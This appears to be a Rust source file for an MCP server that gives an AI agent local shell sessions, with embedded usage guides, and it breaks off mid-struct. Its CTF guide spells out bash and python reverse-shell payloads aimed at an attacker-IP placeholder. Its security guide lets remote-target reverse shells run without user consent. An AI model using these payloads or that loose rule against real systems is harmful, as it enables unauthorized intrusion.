mod audit;

use anyhow::Result;
use dashmap::DashMap;
use shell_engine::exec::exec;
use shell_engine::shell::Shell;
use rmcp::{
    ErrorData as McpError, RoleServer, ServerHandler, ServiceExt,
    handler::server::wrapper::Parameters, model::*, prompt, prompt_handler, prompt_router,
    schemars, service::RequestContext, tool, tool_handler, tool_router, transport::stdio,
};
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Mutex;

// ============================================================
// Default Constants
// ============================================================

mod defaults {
    pub const EXEC_TIMEOUT_MS: u64 = 3000;
    pub const OUTPUT_IDLE_MS: u64 = 200;
    pub const WAIT_FOR_TIMEOUT_MS: u64 = 5000;
    pub const PTY_DEFAULT_COLS: u16 = 100;
    pub const PTY_DEFAULT_ROWS: u16 = 40;
}

// ============================================================
// Guide Documentation (Resources Content)
// ============================================================

mod guides {
    pub const QUICK_START: &str = r#"
Shell MCP Core Principles: Use `exec` for one-off, non-blocking commands.
For operations that require maintaining state or multi-turn interactions
(python/node REPL, gdb, ssh, mysql, sudo confirmation, reverse shells, etc.),
use the closed loop: `shell_spawn -> shell_send_line -> shell_output -> shell_close`.
After sending each step, you must use `shell_output` to confirm the state before deciding on the next step. Do not send commands in batches.

If the target program relies on a real terminal (sudo password prompts, colored output/progress bars,
some remote tools that require a tty), or you need to observe a full-screen redraw-based program,
consider spawning with `shell_spawn(pty=true)` (default size 100x40) and prefer `shell_snapshot`
over `shell_output` to observe the current screen. See guide://shell/pty for details.

For commands with uncertain completion time (gdb continue/run, ssh login prompts, long-running tasks),
prefer `shell_wait_for(pattern=..., timeout_ms=...)` over repeatedly guessing `idle_ms` with `shell_output`.

⚠️ Security Guidelines (MUST read guide://shell/security first): All operations of this tool will be audited and recorded; any operation that may adversely affect the user's local machine (destructive commands, privilege escalation, persistent changes, etc.) must be explained to the user to gain explicit consent before execution.

For detailed scenarios, please read_resource: guide://shell/basics, guide://shell/pty, guide://shell/gdb,
guide://shell/ssh, guide://shell/sudo, guide://shell/reverse_shell,
guide://shell/security
"#;

    pub const SECURITY: &str = r#"
# Security Guidelines (Applicable to all scenarios, highest priority)

This tool runs on the user's actual host machine and has real command execution capabilities; it is NOT a sandbox. Core principle:
**Any operation that may adversely affect the user's local machine must be explained and explicitly approved by the user before execution.**

1. **Audit Trails**: Every `exec` / `shell_spawn` / `shell_send` / `shell_send_line` / `shell_send_control` call is fully recorded (command content, shell type, tag, time). Do not feel overly restricted by the audit, but never assume an operation can be executed "quietly without anyone knowing."

2. **The following types of operations MUST have their intentions explained to the user (what to do, why, and consequences) and require explicit consent before execution**. You cannot assume authorization just because the task description mentions it in passing:
   - **Destructive/Irreversible operations**: `rm -rf`, `dd`, formatting/partitioning disks, dropping databases, overwriting critical files, `git push --force`, deleting large amounts of files/directories.
   - **Privilege escalation/System-level changes**: `sudo`, modifying system configurations (files under /etc), large-scale `chmod`/`chown` modifications, installing/uninstalling system packages, altering firewall rules.
   - **Network exposure/Outbound connections**: Opening listening ports, establishing reverse shells (whether treating the local machine as an attacker or a jump server), exfiltrating local files/keys/environment variables to external addresses.
   - **Persistent changes**: Adding scheduled tasks, startup items, system services, new user accounts.
   - **Process/Resource level disruption**: Killing processes not created by this tool, consuming excessive CPU/memory/disk causing local resource exhaustion.
   - Any command whose outcome is uncertain, difficult to undo, or will significantly alter the current state of the local machine.

3. **Low-risk routine operations can be executed directly without asking every time**, such as: read-only queries (ls/cat/grep/ps/df, etc.), creating/editing files in directories explicitly requested by the user, and repetitive operations already approved by the user (e.g., repeatedly reading the output of the same target in a CTF task). Do not constantly interrupt the user for every harmless command for the sake of "absolute security."

4. **Reverse Shells / SSH Connections to Remote Hosts**: These operations inherently act on remote targets and usually do not directly affect the user's local machine (the local machine merely initiates the connection/listens). Therefore, they can be executed normally according to CTF/debugging scenarios. However, if data returned from the remote side is to be written to the local disk, or if the remote session turns around to initiate actions on the local machine (e.g., tunneling back to the local machine, uploading files to the local machine), you must still follow Rule 2.

5. **When in doubt, ask by default**: If you cannot determine whether a command will significantly affect the local machine state, err on the side of caution—ask the user first instead of assuming "it should be fine" and executing it.

6. **`shell_send_control` (Ctrl+C/Ctrl+D/etc.) and pty-mode operations only act on subprocess sessions created by this tool itself** (identified by tag), not arbitrary processes on the system. Their risk is comparable to normal command execution within the same session; they do not require the elevated scrutiny of Rule 2 by themselves, but if used to forcibly interrupt a task the user is relying on, you should still inform the user of the consequence.
"#;

    pub const BASICS: &str = r#"
# shell_* Basic Usage and Lifecycle

1. shell_spawn(shell, tag, pty=false, cols, rows): Create a session, customize the tag (e.g., "py1").
   Set pty=true to spawn in PTY (pseudo-terminal) mode, default window size 100x40. See guide://shell/pty
   for when this is needed.
2. shell_send_line(input, tag): Send a command and automatically append a newline (Enter); most commonly used. Only returns "sent", without results.
3. shell_send(input, tag): Send content without appending a newline, used for raw text.
4. shell_send_control(tag, key): Send a standard terminal control character (C=interrupt, D=EOF, Z=suspend,
   ?=DEL, etc.), clearer and safer than embedding "\x03"/"^C" inside shell_send/shell_send_line.
5. shell_output(tag, idle_ms): Get the output, MUST be called after every send_line; it waits until the output is silent for idle_ms (default 200ms) before returning the incremental stdout/stderr.
6. shell_wait_for(tag, pattern, timeout_ms): Block until `pattern` appears in stdout/stderr, or until
   timeout (default 5000ms), then return everything collected so far. Prefer this over repeatedly
   guessing idle_ms with shell_output when a command's completion time is uncertain (e.g. waiting for
   a breakpoint hit, a login prompt, or a specific log line). The response's `matched` field tells you
   whether the pattern was actually seen (false = timed out without seeing it).
7. shell_snapshot(tag, idle_ms): Get a rendered terminal screen snapshot (pty sessions only). In pty
   mode, prefer this over shell_output to understand the program's current on-screen state, since
   shell_output in pty mode returns raw bytes intermixed with ANSI escape sequences that are hard to
   interpret directly. See guide://shell/pty.
8. shell_reset(tag): Force restart the session when stuck/in an infinite loop.
9. shell_close(tag): MUST be called when finished to avoid zombie processes.

Limitations: TUI/GUI programs (vim/nano/htop/less) are strictly prohibited in ANY mode (including pty);
use cat/head/grep to view files. pty mode does not lift this restriction — it only helps with terminal-
dependent program behavior and screen observation, not real full-screen interactive control.
For long-running commands (gdb continue, ssh connection, large file downloads): prefer shell_wait_for
with an appropriate pattern; if no specific keyword is known in advance, call shell_output with a larger
idle_ms (2000~5000ms) and poll again rather than waiting indefinitely in a single call.
"#;

    pub const PTY: &str = r#"
# PTY (Pseudo-Terminal) Mode Guide

## When to use pty=true

The default pipe mode (pty=false) is sufficient for the vast majority of scenarios (exec, most
interactive REPLs, ssh, gdb, etc.). Consider explicitly setting pty=true in shell_spawn when:

1. The target program uses isatty()/tcgetattr() to detect whether it's attached to a real terminal
   and changes behavior accordingly, e.g.:
   - `sudo` may refuse to read a password, or behave differently, when not attached to a tty
   - Some CLI tools auto-disable colors/progress bars/interactive confirmations when not on a tty
     (silently falling back to a non-interactive mode)
   - Some remote/management tools require an allocated tty to complete their handshake
2. In pipe mode, shell_output repeatedly returns nothing even though the program should be producing
   output on a real terminal — this is often exactly a missing-tty issue; try re-spawning the same
   command with pty=true.
3. You need to observe full-screen, redraw-based output (progress bars, cursor-positioned status
   panels/tables). In pty mode combined with shell_snapshot you can see the "actual current screen";
   in pipe mode this content would be mixed with large amounts of control sequences and hard to parse.

Default window size is 100 columns x 40 rows, which is enough for most cases; if the target program is
sensitive to window size (pagination, table width, line-wrapping based on column count), you can
customize it via the `cols`/`rows` parameters of shell_spawn.

## In pty mode, prefer shell_snapshot for reading output

In pty mode, stdout/stderr are merged into a single stream, and the raw byte stream contains many ANSI
escape sequences (cursor movement, screen clearing, colors, etc.). Continuing to use shell_output in
this mode gives you the "raw incremental text", which is hard to interpret in full-screen/redraw
scenarios. You should instead call shell_snapshot to get the rendered screen and judge the program's
current state from that before deciding on the next action.

You can still use shell_wait_for / shell_output to detect "whether new output was produced" (e.g.
waiting for a keyword to appear in the raw stream), but once you need to understand the actual screen
layout/content, switch to shell_snapshot.

## Same strict limitations as pipe mode

pty mode does NOT mean full-screen TUI programs (vim/nano/htop/less) can now be treated as something
you can truly interact with in real time. This tool always works by "send one line -> observe the
result -> decide the next step"; it cannot perform real-time interaction that requires continuously
responding to a changing screen. pty mode only exists to (a) satisfy programs that require real
terminal semantics, and (b) allow better observation of full-screen program state — not to enable
genuine full-screen interactive control.

## Typical steps

1. shell_spawn(shell="bash", tag="t1", pty=true)   # default 100x40
2. shell_send_line(input="some_tty_sensitive_command", tag="t1")
3. shell_snapshot(tag="t1", idle_ms=500)           # observe the current screen, instead of shell_output
4. To wait for a specific keyword: shell_wait_for(tag="t1", pattern="...", timeout_ms=3000)
5. shell_close(tag="t1")
"#;

    pub const GDB: &str = r#"
# GDB / pwndbg Debugging Scenario

For every step, you must first read the output to confirm the program state (registers/breakpoints hit) before deciding on the next instruction. You must NEVER send multiple commands in batches in advance.

1. shell_spawn(shell="bash", tag="gdb1")
2. shell_send_line(input="gdb ./target_binary", tag="gdb1")
3. shell_output(tag="gdb1", idle_ms=1000) confirm the (gdb)/pwndbg> prompt appears
   (It is normal for pwndbg to have no output for a long time when loading debug info; just poll multiple times)
4. shell_send_line(input="start", tag="gdb1") followed by shell_output to confirm stopping at the entry breakpoint
5. Commands like continue/run have uncertain execution times: prefer
   shell_wait_for(tag="gdb1", pattern="Breakpoint", timeout_ms=5000) (adjust pattern as needed, e.g.
   "hit"/"exited"); if it times out without matching, call shell_wait_for again instead of waiting
   forever in one call.
6. Upon completion, shell_close(tag="gdb1")

Note: gdb is NOT a valid shell parameter value. You must spawn bash first and then send gdb as a command.
"#;

    pub const SSH: &str = r#"
# SSH Remote Connection Scenario

Intermediate prompts (host fingerprint confirmation, password authentication) may or may not appear. You must observe step-by-step and respond accordingly. Do not assume a fixed number of steps.

1. shell_spawn(shell="bash", tag="ssh1")
2. shell_send_line(input="ssh user@host", tag="ssh1")
3. shell_output(tag="ssh1", idle_ms=1500), or shell_wait_for(tag="ssh1", pattern="password:",
   timeout_ms=3000) if you want to wait specifically for a known prompt; determine the next step based
   on actual content:
   - If "continue connecting (yes/no" appears -> send_line("yes")
   - If "password:" appears -> send_line(password)
   - If the remote prompt appears directly -> key authentication passed
4. Execute remote commands only after confirming successful login (remote prompt/"Last login"); if "Permission denied"/"Connection refused" occurs, terminate the process and report the error.
5. Before finishing, send_line("exit") to return to the local shell, then shell_close(tag="ssh1")

Note: After logging in, all send_line commands are executed on the remote host until an explicit exit.
ssh is also NOT a valid shell parameter value.
"#;

    pub const SUDO: &str = r#"
# sudo Password / y-n Confirmation Scenario

1. shell_spawn(shell="bash", tag="b1")
2. shell_send_line(input="sudo -s apt update", tag="b1")
3. shell_output(tag="b1") observe if "[sudo] password for..." appears
4. shell_send_line(input="password", tag="b1")
5. shell_output(tag="b1", idle_ms=1000) (increase idle_ms if the command is slow)
6. shell_close(tag="b1")

If shell_output repeatedly shows nothing even after sending the sudo command (no password prompt at
all), sudo may be refusing to run without a real terminal. Try re-spawning with
shell_spawn(shell="bash", tag="b1", pty=true) and repeat the steps above; in pty mode prefer
shell_snapshot over shell_output to check the prompt. See guide://shell/pty.
"#;

    pub const REVERSE_SHELL: &str = r#"
# CTF Reverse Shell Scenario

## Typical Workflow: nc listener + target reverse connection

1. Start an interactive listening session locally:
   shell_spawn(shell="bash", tag="listener")
   shell_send_line(input="nc -lvnp 4444", tag="listener")
2. Confirm the listener has started:
   shell_output(tag="listener", idle_ms=500) -> should see "listening on [any] 4444"
3. Trigger the reverse command on the target machine (usually via an acquired web shell / command execution vulnerability), e.g., common payloads (adjust IP/port/interpreter based on actual task):
   - bash: `bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1`
   - python: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<attacker_ip>",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`
   This step is usually NOT executed directly via shell_send_line of this tool (the payload runs on the target). Instead, deliver the payload to the channel that triggers the vulnerability; the listener session of this tool only "receives" the reverse connection.
4. After the reverse connection is established, the listener session itself becomes the target machine's shell:
   shell_output(tag="listener", idle_ms=2000) -> observe if the target machine prompt appears
   (e.g., `www-data@target:/$`), confirming shell access. Or use
   shell_wait_for(tag="listener", pattern="$", timeout_ms=5000) if you expect a specific prompt shape.
5. Stabilize the shell (optional, depends on target environment support):
   shell_send_line(input="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", tag="listener")
   shell_send_line(input="export TERM=xterm", tag="listener")
6. Every subsequent command executed inside the target machine is sent via shell_send_line(tag="listener"). You must use shell_output to confirm the result before deciding the next step, identical to the "all commands execute remotely after login" rule in the SSH scenario.
7. Upon task completion (flag acquired / goal achieved):
   shell_close(tag="listener")

## Key Points

- The listener phase uses local nc. `nc` is NOT an "invalid shell value" here—it is run as a command within the bash session, not passed directly to shell_spawn as the shell parameter.
- The execution environment obtained after the reverse shell connects belongs to the target. These operations act on remote targets and usually do not affect the user's local machine; however, if it involves writing remote data back to the local disk, or the remote host initiating actions on the local machine, you must follow guide://shell/security Rule 2: explain first, then execute.
"#;
}

// ============================================================
// Request Parameter Structs
// ============================================================

#[derive(Debug, Deserialize, schemars::JsonSchema)]
struct ExecParams {
    /// Command content to execute
    input: String,
    /// Interpreter: can be a common shell/interpreter name (bash/sh/zsh/cmd/powershell/python/node),
    /// or an absolute/relative path to an executable to specify a particular version
    /// (e.g., "/usr/local/bin/python3.11", "C:\\nvm\\v20\\node.exe").
    ///
    /// ⚠️ Interactive programs like debuggers (gdb/lldb/windbg), database clients (mysql/psql/redis-cli),
    /// ssh/telnet/nc, etc., are NOT "interpreters" and should NOT be passed here —
    /// you should first start a session using shell_spawn(shell="bash"),
    /// and then use shell_send_line to send them as normal commands.
    /// See resources: guide://shell/gdb, guide://shell/ssh
    shell: String,
    /// Timeout in milliseconds, default 3000
    timeout_ms: Option<u64>,
}

#[derive(Debug, Deserialize, schemars::JsonSchema)]
struct SpawnParams {
    /// Interpreter: can be a common shell/interpreter name (bash/sh/zsh/cmd/powershell/python/node),
    /// or an absolute/relative path to an executable to specify a particular version
    /// (e.g., "/usr/local/bin/python3.11", "C:\\nvm\\v20\\node.exe").
    ///
    /// ⚠️ Interactive programs like debuggers (gdb/lldb/windbg), database clients (mysql/psql/redis-cli),
    /// ssh/telnet/nc, etc., are NOT "interpreters" and should NOT be passed here —
    /// you should first start a session using shell_spawn(shell="bash"),
    /// and then use shell_send_line to send them as normal commands.
    /// See resources: guide://shell/gdb, guide://shell/ssh
    shell: String,
    /// Unique session identifier
    tag: String,
    /// Whether to spawn in PTY (pseudo-terminal) mode, default false (pipe mode).
    /// Enable this for programs that rely on real terminal semantics (some sudo prompts,
    /// colored output/progress bars, tools requiring an allocated tty), or when you need
    /// to observe full-screen redraw-based output via shell_snapshot.
    /// See guide://shell/pty for guidance on when to use this.
    pty: Option<bool>,
    /// PTY window column count, only effective when pty=true, default 100
    cols: Option<u16>,
    /// PTY window row count, only effective when pty=true, default 40
    rows: Option<u16>,
}

#[derive(Debug, Deserialize, schemars::JsonSchema)]
struct SendParams {
    /// Content to send
    input: String,
    /// Target session identifier
    tag: String,
}

#[derive(Debug, Deserialize, schemars::JsonSchema)]
struct OutputParams {
    /// Target session identifier
    tag: String,
    /// Idle timeout in milliseconds, default 200
    idle_ms: Option<u64>,
}

#[derive(Debug, Deserialize, schemars::JsonSchema)]
struct TagParams {
    /// Target session identifier
    tag: String,
}

#[derive(Debug, Deserialize, schemars::JsonSchema)]
struct WaitForParams {
    /// Target session identifier
    tag: String,
    /// Substring expected to appear in stdout or stderr; returns immediately once matched
    pattern: String,
    /// Maximum time to wait in milliseconds; returns whatever has been collected so far
    /// even if the pattern was not matched, default 5000
    timeout_ms: Option<u64>,
}

#[derive(Debug, Deserialize, schemars::JsonSchema)]
struct ControlParams {
    /// Target session identifier
    tag: String,
    /// Control character letter, e.g. "C" = Ctrl+C (interrupt/SIGINT), "D" = Ctrl+D (EOF),
    /// "Z" = Ctrl+Z (suspend, meaningful in pty mode only), "?" = DEL.
    /// Provide only the letter itself, without a "^" prefix.
    key: String,
}

// ============================================================
// Unified Response Structs
// ============================================================

#[derive(Debug, Serialize)]
#[serde(tag = "status", rename_all = "lowercase")]
enum ToolResponse<T: Serialize> {
    Ok { data: T },
    Err { message: String },
}

impl<T: Serialize> ToolResponse<T> {
    fn ok(data: T) -> String {
        serde_json::to_string(&Self::Ok { data })
            .unwrap_or_else(|e| format!(r#"{{"status":"err","message":"Serialization failed: {e}"}}"#))
    }
}

impl ToolResponse<()> {
    fn err(message: impl Into<String>) -> String {
        serde_json::to_string(&ToolResponse::<()>::Err {
            message: message.into(),
        })
            .unwrap_or_else(|e| format!(r#"{{"status":"err","message":"Serialization failed: {e}"}}"#))
    }
}

macro_rules! ok {
    ($data:expr) => {
        ToolResponse::ok($data)
    };
}
macro_rules! err {
    ($msg:expr) => {
        ToolResponse::<()>::err($msg)
    };
}
pub(crate) use err;
pub(crate) use ok;

// ============================================================
// Shell parameter blacklist validation (not an enum but blocks obvious misuse)
// ============================================================

const NOT_A_SHELL: &[&str] = &[
    "gdb", "lldb", "windbg",
    "ssh", "telnet", "nc", "ncat",
    "mysql", "psql", "sqlplus", "redis-cli", "mongo", "mongosh",
    "ftp", "sftp",
];

fn non_shell_hint(shell: &str) -> Option<String> {
    let base = shell
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(shell)
        .trim_end_matches(".exe")
        .to_lowercase();

    NOT_A_SHELL.iter().find(|&&name| base == name).map(|name| {
        format!(
            "'{name}' is not a shell/interpreter and cannot be spawned directly as a shell parameter. \
             Please use shell_spawn(shell=\"bash\", tag=...) first, \
             and then use shell_send_line(input=\"{shell} ...\", tag=...) \
             to execute it as a command within the bash session."
        )
    })
}

// ============================================================
// Service Struct
// ============================================================

#[derive(Clone)]
pub struct TerminalMcpService {
    shells: Arc<DashMap<String, Arc<Mutex<Shell>>>>,
}

impl TerminalMcpService {
    pub fn new() -> Self {
        Self {
            shells: Arc::new(DashMap::new()),
        }
    }

    /// Retrieve the Arc reference of the Shell based on the tag; returns the raw error string
    /// (not pre-formatted as JSON response) so that the caller can handle auditing and response
    /// formatting uniformly via `with_audit`.
    fn get_shell(&self, tag: &str) -> std::result::Result<Arc<Mutex<Shell>>, String> {
        self.shells
            .get(tag)
            .map(|entry| entry.value().clone())
            .ok_or_else(|| format!("Session '{tag}' does not exist"))
    }
}

// ============================================================
// MCP Tool Implementations
// ============================================================

#[tool_router]
impl TerminalMcpService {
    // --------------------------------------------------------
    // Single Execution
    // --------------------------------------------------------

    #[tool(
        description = "Execute a command once using the specified shell interpreter (sh/bash/cmd/powershell/python, etc.), process exits after execution"
    )]
    async fn exec(
        &self,
        Parameters(ExecParams {
                       input,
                       shell,
                       timeout_ms,
                   }): Parameters<ExecParams>,
    ) -> String {
        if let Some(hint) = non_shell_hint(&shell) {
            return err!(hint);
        }

        let timeout = Duration::from_millis(timeout_ms.unwrap_or(defaults::EXEC_TIMEOUT_MS));
        let audit_input = input.clone();
        let audit_shell = shell.clone();

        audit::with_audit(
            "exec",
            None,
            Some(audit_shell),
            Some(audit_input),
            || async move {
                exec(input, shell, Some(timeout))
                    .await
                    .map(|res| serde_json::to_value(res).unwrap_or(serde_json::Value::Null))
                    .map_err(|e| e.to_string())
            },
        )
            .await
    }

    // --------------------------------------------------------
    // Interactive Session Management
    // --------------------------------------------------------

    #[tool(description = "List tags and shell paths of all interactive shell sessions")]
    async fn shell_list(&self) -> String {
        audit::with_audit("shell_list", None, None, None, || async {
            let items: Vec<serde_json::Value> = self
                .shells
                .iter()
                .map(|entry| {
                    let tag = entry.key().clone();
                    match entry.value().try_lock() {
                        Ok(guard) => {
                            #[cfg(feature = "pty")]
                            let (is_pty, pty_size) =
                                (guard.is_pty(), guard.pty_window_size());
                            #[cfg(not(feature = "pty"))]
                            let (is_pty, pty_size): (bool, Option<(u16, u16)>) = (false, None);

                            serde_json::json!({
                                "tag": tag,
                                "shell_path": guard.shell_path,
                                "is_pty": is_pty,
                                "pty_size": pty_size,
                                "stdout_truncated_bytes": guard.output_truncated_bytes(),
                                "stderr_truncated_bytes": guard.error_truncated_bytes(),
                            })
                        }
                        Err(_) => serde_json::json!({ "tag": tag, "busy": true }),
                    }
                })
                .collect();
            Ok(serde_json::json!(items))
        })
            .await
    }

    #[tool(description = "Check if an interactive shell session with the specified tag exists")]
    async fn shell_exists(&self, Parameters(TagParams { tag }): Parameters<TagParams>) -> String {
        let audit_tag = tag.clone();
        audit::with_audit("shell_exists", Some(audit_tag), None, None, || async move {
            Ok(serde_json::json!(self.shells.contains_key(&tag)))
        })
            .await
    }

    #[tool(description = "Create an interactive shell session with the tag as a unique identifier. \
Set pty=true to spawn in PTY (pseudo-terminal) mode, default window size 100x40; see \
guide://shell/pty for when this is needed. For complex debugging/remote connection scenarios, \
it is recommended to first read_resource(guide://shell/gdb or guide://shell/ssh)")]
    async fn shell_spawn(
        &self,
        Parameters(SpawnParams { shell, tag, pty, cols, rows }): Parameters<SpawnParams>,
    ) -> String {
        if let Some(hint) = non_shell_hint(&shell) {
            return err!(hint);
        }

        let use_pty = pty.unwrap_or(false);
        let audit_tag = tag.clone();
        let audit_shell = if use_pty {
            format!("{shell}(pty)")
        } else {
            shell.clone()
        };

        audit::with_audit(
            "shell_spawn",
            Some(audit_tag),
            Some(audit_shell),
            None,
            || async move {
                match self.shells.entry(tag.clone()) {
                    dashmap::Entry::Occupied(_) => Err(format!("Session '{tag}' already exists")),
                    dashmap::Entry::Vacant(slot) => {
                        let mut builder = Shell::new(&shell).enable_buffer();

                        #[cfg(feature = "pty")]
                        if use_pty {
                            builder = builder.enable_pty();
                        }
                        #[cfg(not(feature = "pty"))]
                        if use_pty {
                            return Err(
                                "This build of shell_mcp was not compiled with pty support"
                                    .to_string(),
                            );
                        }

                        let mut s = builder.spawn().await.map_err(|e| e.to_string())?;

                        #[cfg(feature = "pty")]
                        if use_pty {
                            let cols = cols.unwrap_or(defaults::PTY_DEFAULT_COLS);
                            let rows = rows.unwrap_or(defaults::PTY_DEFAULT_ROWS);
                            s.resize(cols, rows).await.map_err(|e| e.to_string())?;
                        }
                        #[cfg(not(feature = "pty"))]
                        {
                            let _ = (cols, rows);
                        }

                        slot.insert(Arc::new(Mutex::new(s)));
                        Ok(serde_json::json!({ "result": "created", "pty": use_pty }))
                    }
                }
            },
        )
            .await
    }

    #[tool(description = "Send content to the specified interactive shell (without appending a newline)")]
    async fn shell_send(
        &self,
        Parameters(SendParams { input, tag }): Parameters<SendParams>,
    ) -> String {
        let audit_tag = tag.clone();
        let audit_input = input.clone();

        audit::with_audit(
            "shell_send",
            Some(audit_tag),
            None,
            Some(audit_input),
            || async move {
                let shell = self.get_shell(&tag)?;
                shell
                    .lock()
                    .await
                    .send(&input)
                    .await
                    .map_err(|e| e.to_string())?;
                Ok(serde_json::json!("sent"))
            },
        )
            .await
    }

    #[tool(description = "Send content to the specified interactive shell and append a newline (equivalent to pressing Enter)")]
    async fn shell_send_line(
        &self,
        Parameters(SendParams { input, tag }): Parameters<SendParams>,
    ) -> String {
        let audit_tag = tag.clone();
        let audit_input = input.clone();

        audit::with_audit(
            "shell_send_line",
            Some(audit_tag),
            None,
            Some(audit_input),
            || async move {
                let shell = self.get_shell(&tag)?;
                shell
                    .lock()
                    .await
                    .send_line(&input)
                    .await
                    .map_err(|e| e.to_string())?;
                Ok(serde_json::json!("sent"))
            },
        )
            .await
    }

    #[tool(description = "Send a standard terminal control character to the specified interactive shell \
(e.g. key=\"C\" for Ctrl+C/interrupt, \"D\" for Ctrl+D/EOF, \"Z\" for Ctrl+Z/suspend, \"?\" for DEL). \
Clearer and safer than embedding raw control bytes or \"^C\"-style strings inside shell_send/shell_send_line. \
In pty mode this is translated to the corresponding standard control byte; in pipe (non-pty) mode only \
two special semantics are preserved: R = reset the session (equivalent to shell_reset), D = send EOF \
(close stdin).")]
    async fn shell_send_control(
        &self,
        Parameters(ControlParams { tag, key }): Parameters<ControlParams>,
    ) -> String {
        let audit_tag = tag.clone();
        let audit_key = key.clone();

        audit::with_audit(
            "shell_send_control",
            Some(audit_tag),
            None,
            Some(format!("^{audit_key}")),
            || async move {
                let ch = key
                    .trim()
                    .chars()
                    .next()
                    .ok_or_else(|| "key must not be empty".to_string())?;

                let shell = self.get_shell(&tag)?;
                shell
                    .lock()
                    .await
                    .send_control_char(ch)
                    .await
                    .map_err(|e| e.to_string())?;
                Ok(serde_json::json!("sent"))
            },
        )
            .await
    }

    #[tool(description = "Get the output of the specified interactive shell (including stdout and stderr)")]
    async fn shell_output(
        &self,
        Parameters(OutputParams { tag, idle_ms }): Parameters<OutputParams>,
    ) -> String {
        let audit_tag = tag.clone();

        audit::with_audit("shell_output", Some(audit_tag), None, None, || async move {
            let shell = self.get_shell(&tag)?;
            let idle = Some(Duration::from_millis(
                idle_ms.unwrap_or(defaults::OUTPUT_IDLE_MS),
            ));

            let mut guard = shell.lock().await;
            let result = guard.output(idle).await;
            drop(guard);

            Ok(serde_json::json!({ "stdout": result.stdout, "stderr": result.stderr }))
        })
            .await
    }

    #[tool(description = "Block and wait until `pattern` appears in stdout/stderr of the specified session, \
or until `timeout_ms` elapses (default 5000), then return everything collected so far. \
Suitable for commands with uncertain completion time (gdb continue/run hitting a breakpoint, \
yes/password prompts during ssh login, long-running task completion markers, etc.). Compared to \
repeatedly calling shell_output(idle_ms=...) and manually guessing the wait time, this significantly \
reduces the number of interaction turns. The `matched` field in the response indicates whether the \
pattern was actually seen (false means it timed out without matching).")]
    async fn shell_wait_for(
        &self,
        Parameters(WaitForParams { tag, pattern, timeout_ms }): Parameters<WaitForParams>,
    ) -> String {
        let audit_tag = tag.clone();
        let audit_pattern = pattern.clone();

        audit::with_audit(
            "shell_wait_for",
            Some(audit_tag),
            None,
            Some(audit_pattern),
            || async move {
                let shell = self.get_shell(&tag)?;
                let timeout = Duration::from_millis(
                    timeout_ms.unwrap_or(defaults::WAIT_FOR_TIMEOUT_MS),
                );

                let mut guard = shell.lock().await;
                let result = guard.output_until(pattern.clone(), Some(timeout)).await;
                drop(guard);

                let matched =
                    result.stdout.contains(&pattern) || result.stderr.contains(&pattern);

                Ok(serde_json::json!({
                    "stdout": result.stdout,
                    "stderr": result.stderr,
                    "matched": matched,
                }))
            },
        )
            .await
    }

    #[tool(description = "Get a rendered virtual terminal screen snapshot of the specified session \
(only valid for sessions created with pty=true). Returns the current on-screen text after interpreting \
cursor movement/screen-clearing/color control sequences, instead of a raw byte stream. In pty mode, \
prefer this over shell_output to judge the program's current state (progress bars, screens after a \
clear, cursor-positioned redraw-based output), because shell_output returns raw incremental bytes that \
may contain heavy control sequences or already-overwritten intermediate frames and are hard to interpret \
directly. Note: this tool is only for 'observing' the current screen; it does not mean real full-screen \
interactive operation (vim/nano/htop, etc.) is now allowed.")]
    async fn shell_snapshot(
        &self,
        Parameters(OutputParams { tag, idle_ms }): Parameters<OutputParams>,
    ) -> String {
        let audit_tag = tag.clone();

        audit::with_audit("shell_snapshot", Some(audit_tag), None, None, || async move {
            #[cfg(feature = "pty")]
            {
                let shell = self.get_shell(&tag)?;
                let idle = Some(Duration::from_millis(
                    idle_ms.unwrap_or(defaults::OUTPUT_IDLE_MS),
                ));

                let mut guard = shell.lock().await;
                let screen = guard
                    .output_snapshot(idle)
                    .await
                    .map_err(|e| e.to_string())?;
                drop(guard);

                Ok(serde_json::json!({ "screen": screen }))
            }
            #[cfg(not(feature = "pty"))]
            {
                let _ = (tag, idle_ms);
                Err("This build of shell_mcp was not compiled with pty support".to_string())
            }
        })
            .await
    }

    #[tool(description = "Reset the specified interactive shell session (exit and restart)")]
    async fn shell_reset(&self, Parameters(TagParams { tag }): Parameters<TagParams>) -> String {
        let audit_tag = tag.clone();

        audit::with_audit("shell_reset", Some(audit_tag), None, None, || async move {
            let shell = self.get_shell(&tag)?;
            shell
                .lock()
                .await
                .reset()
                .await
                .map_err(|e| e.to_string())?;
            Ok(serde_json::json!("reset"))
        })
            .await
    }

    #[tool(description = "Close and remove the specified interactive shell session")]
    async fn shell_close(&self, Parameters(TagParams { tag }): Parameters<TagParams>) -> String {
        let audit_tag = tag.clone();

        audit::with_audit("shell_close", Some(audit_tag), None, None, || async move {
            match self.shells.remove(&tag) {
                Some((_, shell)) => {
                    shell.lock().await.close().map_err(|e| e.to_string())?;
                    Ok(serde_json::json!("closed"))
                }
                None => Err(format!("Session '{tag}' does not exist")),
            }
        })
            .await
    }

    #[tool(description = "Close and remove all interactive shell sessions")]
    async fn shell_close_all(&self) -> String {
        audit::with_audit("shell_close_all", None, None, None, || async {
            let tags: Vec<String> = self
                .shells
                .iter()
                .map(|entry| entry.key().clone())
                .collect();

            let mut closed = Vec::new();
            let mut errors = Vec::new();

            for tag in tags {
                if let Some((_, shell)) = self.shells.remove(&tag) {
                    match shell.lock().await.close() {
                        Ok(_) => closed.push(tag),
                        Err(e) => errors.push(format!("{tag}: {e}")),
                    }
                }
            }

            Ok(serde_json::json!({ "closed": closed, "errors": errors }))
        })
            .await
    }
}

// ============================================================
// Prompt Parameter Structs
// ============================================================

#[derive(Debug, Serialize, Deserialize, schemars::JsonSchema)]
pub struct GdbDebugArgs {
    #[schemars(description = "Path to the executable to debug")]
    pub binary_path: String,
    #[schemars(description = "Session tag, defaults to gdb1")]
    pub tag: Option<String>,
}

#[derive(Debug, Serialize, Deserialize, schemars::JsonSchema)]
pub struct SshConnectArgs {
    #[schemars(description = "Target host, IP or domain")]
    pub host: String,
    #[schemars(description = "Login username")]
    pub user: String,
    #[schemars(description = "Session tag, defaults to ssh1")]
    pub tag: Option<String>,
}

#[derive(Debug, Serialize, Deserialize, schemars::JsonSchema)]
pub struct ReverseShellArgs {
